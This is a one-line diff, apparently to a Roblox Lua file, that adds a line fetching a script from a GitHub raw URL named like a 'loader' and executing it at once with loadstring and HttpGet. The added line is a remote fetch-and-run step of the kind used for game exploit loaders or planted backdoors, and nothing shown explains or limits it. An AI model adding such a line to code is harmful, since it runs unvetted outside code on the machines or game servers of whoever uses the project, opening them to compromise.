@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/hide-in-pixels-spam5-pzivcftshrpxd3.lua"))()
